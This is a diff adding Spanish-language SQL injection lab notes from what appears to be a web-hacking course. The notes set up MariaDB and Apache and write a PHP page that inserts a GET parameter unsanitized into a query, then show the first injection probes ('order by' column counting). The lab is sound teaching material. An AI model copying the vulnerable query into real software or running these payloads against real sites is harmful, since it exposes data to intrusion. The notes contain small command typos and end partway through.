@@ -2128,3 +2128,84 @@ Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden ut
 A continuación, se proporciona el enlace a la utilidad online de 'ExtendsClass' que utilizamos en esta clase:
 
 [ExtendsClass MySQL Online](https://extendsclass.com/mysql-online.html)
+
+```bash
+apt install mariadb-server apache2 php-mysql
+servide mysql start
+lsof -i:3306
+service apache2 start
+lsof:80
+mysql -uroot -p
+# Damos enter sin proporcionar contraseña
+# ----- Estamos dentro de mysql
+show databases;
+# Nos muestra 3 bases de datos: mysql, information_schema, performance_schema
+use mysql;
+# Database changed
+show tables;
+describe user;
+select user,password from user;
+# 3 rows in set
+select user,password from user where user = 'root';
+
+# Creamos nuestra base de datos para hacer ejercicios
+create database Hack4u;
+show databases;
+user Hack4u;
+# Database changed
+show tables;
+create table users(id int(32), username varchar(32), password varchar(32));
+show tables; # Muestra la tabla recien creada
+describe users;
+insert into users(id, username, password) values (1, 'admin', 'admin123');
+insert into users(id, username, password) values (2, 's4vitar', 's4vitar123');
+insert into users(id, username, password) values (3, 'gera', 'gera123');
+select * from users;
+create user 's4vitar'@'localhost' identified by 's4vitar456'; # Creamos un usuario para que se conecte a la base de datos
+grant all privileges on Hack4u.* to 's4vitar'@'localhost' # Otorgamos los permisos para que se pueda conectar y operar.
+# La cadena Hack4u.* indica que obtendra permiso a todas las tablas de la bd
+Ctrl + c # Salimos de la sesion de Mysql
+# ----- Salimos de mysql
+
+# Verificar que apache esté corriendo: service apache2 status
+cd /var/www/html/
+nvim searchUsers.php
+# ----- searchUsers.php Inicio
+<?
+    $server = "localhost";
+    $username = "s4vitar";
+    $password = "s4vitar456";
+    $database = "Hack4u";
+
+    # Conexión a la base de datos
+    $conn = new mysqli($server, $username, $password, $database);
+
+    $id = $_GET['id'];
+    
+    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
+
+    $response = mysqli_fetch_array($data);
+
+    echo $response['username'];
+
+?>
+# ----- searchUsers.php Fin
+
+# Con el script guardado nos vamos al navegador que alberga el php
+localhost/searchUsers.php?id=3'
+localhost/searchUsers.php?id=3' order by 100-- - # Al dar a enter nos muestra "Uknown column '100' in 'order clause'
+
+# Replicamos el error en mysql, ambas formas nos dan el mismo error
+select username from users where id = '3' order by 100;-- -';
+select username from users where id = '3' order by 100;#';
+
+# Savitar nos dice que nuestra mision como atacantes es determinar cuantas columnas tiene la tabla
+select username from users where id = '3' order by 2;#'; # Nos dice que no son 2
+# Pero hace alusión a los campos que tenemos seleccionados, en esta caso: users
+select username from users where id = '3' order by 1;#'; # Nos muestra la info requerida
+# Minuto 27:59 
+
+
+
+
+```
